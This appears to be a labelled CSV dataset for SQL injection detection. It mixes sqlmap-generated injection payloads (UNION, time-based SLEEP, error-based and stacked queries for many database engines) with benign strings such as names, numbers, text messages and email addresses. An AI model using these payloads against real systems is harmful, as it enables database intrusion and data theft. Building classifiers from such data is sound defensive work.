payload,label
"sqlmap/1.4.4#stable (http://sqlmap.org) AND EXTRACTVALUE(9244,CONCAT(0x5c,0x7176707171,(SELECT (ELT(9244=9244,1))),0x716a786a71))-- oRMz",1
ysero,0
20115,0
' WHERE 3357=3357 AND SLEEP(5)#,1
alvis,0
"sqlmap/1.4.4#stable (http://sqlmap.org)"") AS smxW WHERE 1235=1235 AND ROW(5057,2281)>(SELECT COUNT(*),CONCAT(0x7176707171,(SELECT (ELT(5057=5057,1))),0x716a786a71,FLOOR(RAND(0)*2))x FROM (SELECT 7931 UNION SELECT 4089 UNION SELECT 4184 UNION SELECT 4634)a GROUP BY x)-- iXor",1
"-6024') AS FRZp WHERE 1299=1299 OR (SELECT (CASE WHEN (2840=2840) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,2840) END) FROM DUAL) IS NULL-- YRux",1
vUXo') AS Ryab WHERE 8415=8415 AND (SELECT 8109 FROM (SELECT(SLEEP(5)))HHLD)-- yDEA,1
"1' or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)",1
"-4466') AS SUzS WHERE 9222=9222 UNION ALL SELECT 9222,9222,9222,9222,9222,9222,9222,9222,9222,9222,9222,9222,9222,9222,9222,9222,9222,9222,9222,9222,9222,9222,9222,9222,9222,9222,9222,9222,9222,9222,9222,9222,9222,9222,9222,9222,9222,9222#",1
-3779`) WHERE 4634=4634 ORDER BY 1-- vPpO,1
"-4444') OR ELT(3790=9861,9861) AND ('VQvD'='VQvD",1
"-9080' IN BOOLEAN MODE) UNION ALL SELECT 9100,9100,9100,9100,9100,9100,9100,9100,9100,9100,9100,9100,9100,9100,9100,9100,9100,9100,9100,9100,9100,9100,9100,9100,9100,9100,9100,9100,9100,9100,9100,9100,9100,9100,9100,9100,9100#",1
"sexC)) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
"' IN BOOLEAN MODE) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- vgpi",1
brewster,0
"-7839' UNION ALL SELECT 8343,8343,8343,8343,8343,8343,8343,8343,8343,8343,8343,8343,8343,8343,8343,8343,8343,8343,8343,8343,8343,8343,8343#",1
lara,0
"cbHd"")) AS jtcQ WHERE 1447=1447 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- mLVJ",1
coca artero,0
"-4933')) AS Tyuq WHERE 1731=1731 UNION ALL SELECT 1731,1731#",1
44251271f,0
02021971,0
"-3646) OR 6780=CONCAT(CHAR(113)+CHAR(118)+CHAR(112)+CHAR(113)+CHAR(113),(SELECT (CASE WHEN (6780=6780) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(106)+CHAR(120)+CHAR(106)+CHAR(113)) AND (7412=7412",1
iranzo,0
"-7133)) AS LuQG WHERE 2891=2891 OR ELT(5600=5600,1488)-- TCoY",1
"-6861' UNION ALL SELECT 9505,9505,9505,9505,9505,9505,9505,9505,9505,9505,9505,9505,9505,9505,9505,9505,9505,9505,9505,9505,9505,9505,9505,9505,9505,9505,9505,9505,9505,9505,9505,9505,9505,9505,9505,9505-- rOSh",1
Sorry I'll call later  &lt;#&gt; mins,0
"-8450' UNION ALL SELECT 2274,2274,2274,2274,2274,2274,2274,2274,2274,2274,2274,2274,2274,2274,2274,2274,2274,2274,2274,2274,2274,2274,2274,2274,2274,2274-- XNOy",1
capecod,0
b1a838c2fal8,0
1illabarqu2,0
"-7958') AS RtyQ WHERE 7885=7885 OR 1 GROUP BY CONCAT(0x7176707171,(SELECT (CASE WHEN (2702=2702) THEN 1 ELSE 0 END)),0x716a786a71,FLOOR(RAND(0)*2)) HAVING MIN(0)#",1
7894,0
rasifo,0
higueruela,0
12365478,0
ea,0
"AND (SELECT 1579 FROM(SELECT COUNT(*),CONCAT(0x7176707171,(SELECT (ELT(1579=1579,1))),0x716a786a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- TXbQ",1
revacunacin,0
" ( select * from  ( select ( sleep ( 5  )  )   ) srmq )  and   (  (  ""xeki"" like ""xeki",1
39660,0
3548348718435303,0
"c/ reval s/n, 13-h",0
sonoma,0
"-2347"")) OR ELT(5078=5082,5082) AND ((""oExs"" LIKE ""oExs",1
cbHd')) AS KRAs WHERE 2326=2326 OR 4316=(SELECT 4316 FROM PG_SLEEP(5))--,1
kirby,0
")) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
charpini_daillie@inmobiliariahangar.ly,0
olimpia,0
"https://keystrokebiometrics.xyz:443/"") AS dFdq WHERE 5668=5668 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7176707171,(SELECT (ELT(3445=3445,1))),0x716a786a71,0x78))s), 8446744073709551610, 8446744073709551610)))-- vOBB",1
mudvayne,0
caamao alayo,0
"sqlmap/1.4.4#stable (http://sqlmap.org)` WHERE 7509=7509 AND ELT(8076=8076,SLEEP(5))#",1
"-9068') UNION ALL SELECT 6039,6039,6039,6039,6039,6039,6039,6039,6039-- LKvK",1
"vyHv""))) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- cIcB",1
3o22ciabl3,0
dowd,0
"') OR 4626=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)--",1
5825253039721313,0
134679,0
"vyHv||(SELECT (CHR(65)||CHR(104)||CHR(81)||CHR(108)) FROM DUAL WHERE 2499=2499 AND 5220=(SELECT COUNT(*) FROM GENERATE_SERIES(1,5000000))--",1
Babe have you got enough money to pick up bread and milk ? And I'll give you it back when you get home ?,0
florez,0
7482251600785207,0
")) AS Dvep WHERE 8844=8844 AND EXTRACTVALUE(5294,CONCAT(0x5c,0x7176707171,(SELECT (ELT(5294=5294,1))),0x716a786a71))-- oSET",1
"-2889)) as iqzv where 1786=1786 union all select 1786,1786,1786,1786,1786,1786,1786,1786--",1
"1""))) and 6969=(select 6969 from pg_sleep(5)) and (((""ipqw"" like ""ipqw",1
"1"" )  or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and  ( ""eeye"" = ""eeye",1
"grado, el",0
"vyHv""))) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- hKkx",1
42141,0
8417338456175136,0
"cbHd`) WHERE 4456=4456 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
navacepedilla de corneja,0
"-9178"")) UNION ALL SELECT 4450,4450,4450,4450,4450,4450,4450,4450,4450,4450,4450,4450,4450,4450,4450,4450,4450,4450,4450,4450,4450,4450,4450,4450,4450,4450,4450,4450,4450,4450,4450,4450,4450,4450,4450,4450,4450,4450,4450,4450,4450-- OGei",1
"sqlmap/1.4.4#stable (http://sqlmap.org)"" WHERE 4416=4416 AND 4225=(ASCII_CHAR(113)||ASCII_CHAR(118)||ASCII_CHAR(112)||ASCII_CHAR(113)||ASCII_CHAR(113)||(SELECT CASE 4225 WHEN 4225 THEN 1 ELSE 0 END FROM RDB$DATABASE)||ASCII_CHAR(113)||ASCII_CHAR(106)||ASCII_CHAR(120)||ASCII_CHAR(106)||ASCII_CHAR(113))-- ylFy",1
"1' and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )  ",1
"-1368  )  )   union all select 1310,1310,1310,1310,1310#",1
"-7488""))) UNION ALL SELECT 8249,8249,8249,8249,8249,8249,8249,8249,8249,8249,8249,8249,8249,8249,8249,8249,8249,8249,8249,8249,8249,8249,8249,8249,8249,8249,8249,8249,8249,8249,8249,8249,8249,8249,8249,8249,8249,8249,8249,8249,8249,8249,8249,8249,8249,8249,8249,8249,8249,8249-- zHUc",1
setin cardona,0
eficiente,0
"sqlmap/1.4.4#stable (http://sqlmap.org)||(SELECT CHR(90)||CHR(122)||CHR(111)||CHR(107) FROM DUAL WHERE 3206=3206 AND 4927=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5))||",1
"cbHd) OR 2053=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))) AND (8870=8870",1
737373,0
"1', ( select  ( case when  ( 8382 = 8382 )  then 1 else 1/ ( select 0 )  end  )  )  ",1
"https://keystrokebiometrics.xyz:443/))) OR 1324=LIKE(CAST(X'41424344454647' AS TEXT),UPPER(HEX(RANDOMBLOB(500000000/2))))--",1
"'))) AND 9222=(SELECT COUNT(*) FROM GENERATE_SERIES(1,5000000)) AND ((('YucD' LIKE 'YucD",1
"TAAm' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
"nardo, 12, 13e",0
montagnani_walling@am-si.sh,0
"-4567"")) AS taQf WHERE 3890=3890 OR 3298=(SELECT (CASE WHEN (3298=6301) THEN 3298 ELSE (SELECT 6301 UNION SELECT 9997) END))-- Poif",1
"-9860"") AS otMT WHERE 4916=4916 OR MAKE_SET(8079=8569,8569)-- vDPt",1
"TAAm'||(SELECT (CHR(107)||CHR(97)||CHR(66)||CHR(115)) FROM DUAL WHERE 1289=1289 OR 4706=(SELECT COUNT(*) FROM GENERATE_SERIES(1,5000000)))||'",1
"WHERE 8133=8133 OR 6030=BENCHMARK(5000000,MD5(0x78644161))-- jmYh",1
143143,0
"1') or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)",1
mcginnis-dellagnese@storagecraft.na,0
"vyHv') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
TAAm' RLIKE (SELECT 2160 FROM (SELECT(SLEEP(5)))Zizp) AND 'gmAL' LIKE 'gmAL,1
pu128,0
"cbHd"") AND 1347=9947#",1
I wan but too early lei... Me outside now wun b home so early... Neva mind then...,0
"1%"" )  and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
rosalinda,0
hooligan,0
desparpajo,0
' AND (SELECT 8940 FROM (SELECT(SLEEP(5)))JYjV) AND 'DEDT'='DEDT,1
"-7149 UNION ALL SELECT 3655,3655,3655,3655,3655,3655,3655,3655,3655,3655,3655,3655,3655,3655,3655,3655,3655,3655,3655,3655,3655,3655,3655,3655,3655,3655,3655,3655,3655,3655,3655,3655,3655,3655,3655,3655,3655,3655,3655,3655,3655,3655,3655,3655,3655,3655,3655-- Zadg",1
ciclotimia,0
"-3206 UNION ALL SELECT 1164,1164,1164,1164,1164,1164,1164,1164,1164,1164,1164,1164,1164,1164,1164,1164,1164,1164,1164,1164#",1
9431159156347522,0
harrell,0
lakshmin,0
6_ocin,0
caizares,0
25187,0
"cbHd"")) RLIKE (SELECT 2593 FROM (SELECT(SLEEP(5)))OdNG) AND ((""BbMc"" LIKE ""BbMc",1
80216904b,0
"' OR 9372=(SELECT COUNT(*) FROM GENERATE_SERIES(1,5000000)) OR 'tFiw'='tsFA",1
]-(SELECT 0 WHERE 7990=7990;SELECT (CASE WHEN (4485=8688) THEN 4485 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL--,1
"calle el jazmin, 144 6?d",0
gilmartin,0
"sexC""))) OR 3039=(SELECT 3039 FROM PG_SLEEP(5)) AND (((""OiHS""=""OiHS",1
`) WHERE 1985=1985 RLIKE (SELECT 5922 FROM (SELECT(SLEEP(5)))wfOt)#,1
"https://keystrokebiometrics.xyz:443/ WHERE 7302=7302 AND EXTRACTVALUE(6816,CONCAT(0x5c,0x7176707171,(SELECT (ELT(6816=6816,1))),0x716a786a71))-- XDxU",1
"sqlmap/1.4.4#stable (http://sqlmap.org)' UNION ALL SELECT NULL,NULL#",1
"sqlmap/1.4.4#stable (http://sqlmap.org)) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
toolbox,0
6764,0
mouse,0
belmondo@artesania.org.ci,0
"1' where 6953=6953 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
DtRW)) AND 6170=8752#,1
"-5371'))) OR MAKE_SET(8657=8657,4105) AND ((('WRDJ'='WRDJ",1
"vyHv"" RLIKE (SELECT 2026 FROM (SELECT(SLEEP(5)))ruWb) AND ""DRDU"" LIKE ""DRDU",1
"https://keystrokebiometrics.xyz:443/' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ecNw",1
"-9344')) AS wjtm WHERE 1581=1581 UNION ALL SELECT 1581,1581,1581,1581,1581,1581,1581,1581,1581,1581,1581,1581,1581,1581,1581,1581,1581,1581,1581#",1
"+(SELECT CHAR(66)||CHAR(80)||CHAR(102)||CHAR(113) WHERE 6024=6024 (SELECT (CASE WHEN (8093=8093) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8093),0),500000000),NULL) ELSE CHAR(109)||CHAR(109)||CHAR(114)||CHAR(74) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS))+",1
") AS kioZ WHERE 7846=7846 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
swaden,0
DtRW) AND 7413=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)--,1
"https://keystrokebiometrics.xyz:443/""))) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
09140,0
""") WHERE 3571=3571 AND 6974=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)--",1
"-1956"")) OR 1847=9426-- Nccj",1
"vUXo`=`vUXo` OR (SELECT 6063 FROM(SELECT COUNT(*),CONCAT(0x7176707171,(SELECT (ELT(6063=6063,1))),0x716a786a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND `vUXo`=`vUXo",1
weddle@teamspanish.bz,0
"-3317 UNION ALL SELECT 1090,1090,1090,1090,1090,1090,1090,1090,1090,1090,1090,1090,1090,1090,1090,1090,1090,1090,1090,1090,1090,1090,1090,1090,1090,1090,1090,1090,1090,1090,1090,1090,1090,1090,1090,1090,1090,1090,1090,1090,1090,1090,1090,1090,1090,1090,1090#",1
brines grimalda,0
5155735586136937,0
sedo kohls,0
"https://keystrokebiometrics.xyz:443/' IN BOOLEAN MODE) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#",1
"norte 131, 8?e",0
05147,0
sophi,0
"-5287"") UNION ALL SELECT 9218,9218,9218,9218,9218,9218,9218,9218,9218,9218,9218,9218,9218,9218,9218,9218,9218,9218,9218,9218,9218,9218,9218,9218,9218,9218,9218,9218,9218,9218,9218,9218,9218,9218,9218,9218#",1
9029322975173730,0
2613,0
morales del vino,0
ilve,0
cbHd') AND 8633=4777#,1
macready-vlaenderen3@citycvs.tr,0
pascuet landivar,0
"c/ pedro hidalgo, 137, 9?g",0
"-7337"")) AS NVTv WHERE 3672=3672 UNION ALL SELECT 3672,3672,3672,3672,3672,3672,3672,3672,3672,3672,3672,3672,3672,3672#",1
cuenca,0
"-6109' UNION ALL SELECT 9697,9697,9697,9697,9697,9697,9697,9697,9697,9697,9697,9697,9697,9697,9697,9697,9697,9697,9697,9697,9697,9697,9697,9697,9697,9697,9697,9697,9697,9697,9697,9697,9697,9697,9697,9697,9697,9697,9697,9697,9697,9697,9697,9697,9697,9697,9697,9697,9697-- VxxY",1
"-6066) UNION ALL SELECT 2784,2784,2784,2784,2784,2784,2784,2784,2784,2784,2784,2784,2784,2784,2784,2784,2784,2784,2784,2784,2784,2784,2784,2784,2784#",1
canucks,0
"cbHd'))) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- lJPs",1
"-9297') AS yZLk WHERE 3524=3524 UNION ALL SELECT 3524,3524,3524,3524,3524,3524,3524,3524,3524,3524,3524,3524,3524,3524,3524,3524,3524,3524,3524,3524,3524,3524,3524,3524,3524,3524,3524,3524,3524,3524,3524,3524,3524,3524,3524,3524,3524,3524-- wfdn",1
"sqlmap/1.4.4#stable (http://sqlmap.org)"")) AS vIFp WHERE 3501=3501;SELECT (CASE WHEN (2056=3453) THEN 2056 ELSE 1/(SELECT 0) END)--",1
ayyuce,0
francisc,0
"OR 7614=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",1
"-2194) AS Ybxo WHERE 9337=9337 UNION ALL SELECT 9337,9337,9337,9337,9337,9337,9337,9337,9337,9337,9337,9337,9337,9337,9337,9337,9337,9337,9337,9337,9337,9337,9337,9337,9337,9337,9337,9337,9337,9337,9337,9337,9337,9337,9337,9337,9337#",1
"vyHv' AND 2805=(SELECT COUNT(*) FROM GENERATE_SERIES(1,0000000))-- yPiO",1
",(SELECT (CASE WHEN (9760=5753) THEN '' ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)",1
04270,0
46960,0
spud,0
1 where 7516=7516 union all select null#,1
iceman,0
samuel,0
"-5987""))) OR 7276=CAST((CHR(113)||CHR(118)||CHR(112)||CHR(113)||CHR(113))||(SELECT (CASE WHEN (7276=7276) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(106)||CHR(120)||CHR(106)||CHR(113)) AS NUMERIC) AND (((""PyOR"" LIKE ""PyOR",1
haiti 27 1?g,0
9270,0
trumpet,0
"https://keystrokebiometrics.xyz:443/' OR (SELECT 7380 FROM(SELECT COUNT(*),CONCAT(0x7176707171,(SELECT (ELT(7380=7380,1))),0x716a786a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'xBoB'='xBoB",1
"-7865' OR 5316=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(112)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (5316=5316) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(120)+CHAR(106)+CHAR(113))) OR 'XJzn'='WRxu",1
"sexC' AND ELT(7090=5722,5722) AND 'RAPV' LIKE 'RAPV",1
sexC') AND 5206=CAST((CHR(113)||CHR(118)||CHR(112)||CHR(113)||CHR(113))||(SELECT (CASE WHEN (5206=5206) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(106)||CHR(120)||CHR(106)||CHR(113)) AS NUMERIC) AND ('TFxq' LIKE 'TFxq,1
13081986,0
"sexC||(SELECT CHAR(118)||CHAR(122)||CHAR(69)||CHAR(100) FROM DUAL WHERE 3396=3396 OR CHAR(79)||CHAR(117)||CHAR(66)||CHAR(115)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),500000000),NULL)--",1
"cbHd UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
"TAAm"") UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Ohhi",1
4687701725293094,0
What happen to her tell the truth,0
"sexC"")) ORDER BY 1#",1
domeable,0
"-9420)) UNION ALL SELECT 9968,9968,9968,9968,9968,9968,9968,9968,9968,9968,9968,9968,9968,9968,9968,9968,9968,9968,9968,9968,9968,9968,9968,9968,9968,9968#",1
1970,0
paris1,0
https://keystrokebiometrics.xyz:443/'+(SELECT ASCII_CHAR(67)||ASCII_CHAR(81)||ASCII_CHAR(104)||ASCII_CHAR(78) WHERE 9921=9921 AND 3014=(ASCII_CHAR(113)||ASCII_CHAR(118)||ASCII_CHAR(112)||ASCII_CHAR(113)||ASCII_CHAR(113)||(SELECT CASE 3014 WHEN 3014 THEN 1 ELSE 0 END FROM RDB$DATABASE)||ASCII_CHAR(113)||ASCII_CHAR(106)||ASCII_CHAR(120)||ASCII_CHAR(106)||ASCII_CHAR(113)))+',1
"-5102)) AS npej WHERE 2659=2659 UNION ALL SELECT 2659,2659,2659,2659,2659,2659,2659-- XkfC",1
1' where 4795=4795 and 4595=4595#,1
"TAAm`) WHERE 2944=2944 PROCEDURE ANALYSE(EXTRACTVALUE(8470,CONCAT(0x5c,0x7176707171,(SELECT (CASE WHEN (8470=8470) THEN 1 ELSE 0 END)),0x716a786a71)),1)-- hToG",1
"zoma, la",0
"sqlmap/1.4.4#stable (http://sqlmap.org)') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Vbpa",1
vUXo'))) AND 9794=8015 AND ((('cwyo' LIKE 'cwyo,1
"') AS arLf WHERE 9302=9302 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
spitfire,0
"sqlmap/1.4.4#stable (http://sqlmap.org)||(SELECT CHR(81)||CHR(99)||CHR(75)||CHR(100) FROM DUAL WHERE 6589=6589 AND 3536=CTXSYS.DRITHSX.SN(3536,(CHR(113)||CHR(118)||CHR(112)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (3536=3536) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(106)||CHR(120)||CHR(106)||CHR(113))))||",1
yutaka,0
Hi! You just spoke to MANEESHA V. We'd like to know if you were satisfied with the experience. Reply Toll Free with Yes or No.,0
marcum3,0
vUXo'))) RLIKE SLEEP(5) AND ((('XGAg' LIKE 'XGAg,1
landolfi ribas,0
"-8415' UNION ALL SELECT 4925,4925,4925,4925,4925,4925,4925,4925,4925,4925,4925,4925,4925,4925,4925,4925,4925,4925,4925,4925,4925,4925,4925,4925,4925,4925,4925,4925,4925,4925,4925,4925,4925,4925,4925,4925,4925,4925,4925,4925,4925,4925,4925,4925#",1
valentino,0
milkman,0
+(SELECT (CHR(89)||CHR(65)||CHR(73)||CHR(73)) WHERE 9668=9668 AND 4355=3078)+,1
"-3023"")) AS XCIl WHERE 9450=9450 UNION ALL SELECT 9450,9450,9450,9450,9450,9450,9450,9450,9450,9450,9450,9450,9450,9450,9450,9450,9450,9450,9450,9450-- AeCq",1
"TAAm') WHERE 1957=1957 OR 3170=BENCHMARK(5000000,MD5(0x4d65516e))-- Fuvv",1
"cbHd""))) AND 9874=CTXSYS.DRITHSX.SN(9874,(CHR(113)||CHR(118)||CHR(112)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (9874=9874) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(106)||CHR(120)||CHR(106)||CHR(113))) AND (((""LZUi""=""LZUi",1
48426953q,0
vyHv'))) AND 8333=(SELECT 8333 FROM PG_SLEEP(5))--,1
vyHv ORDER BY 3098#,1
""") OR ELT(9465=9465,SLEEP(5)) AND (""STAd"" LIKE ""STAd",1
"vyHv"")) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- NsxJ",1
cbHd) AS DnRC WHERE 1404=1404 OR 8285=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)-- OXhB,1
"1) as zhvx where 3171=3171 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--",1
") AND 9659=CONCAT(CHAR(113)+CHAR(118)+CHAR(112)+CHAR(113)+CHAR(113),(SELECT (CASE WHEN (9659=9659) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(106)+CHAR(120)+CHAR(106)+CHAR(113)) AND (5084=5084",1
ronaldo,0
"sqlmap/1.4.4#stable (http://sqlmap.org)"" UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
"-6750'))) UNION ALL SELECT 3472,3472,3472,3472,3472,3472,3472,3472,3472,3472,3472,3472,3472,3472,3472,3472,3472,3472,3472,3472,3472,3472,3472,3472,3472,3472,3472,3472,3472-- sktK",1
heaven,0
gallifa,0
"vyHv' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- kBPe",1
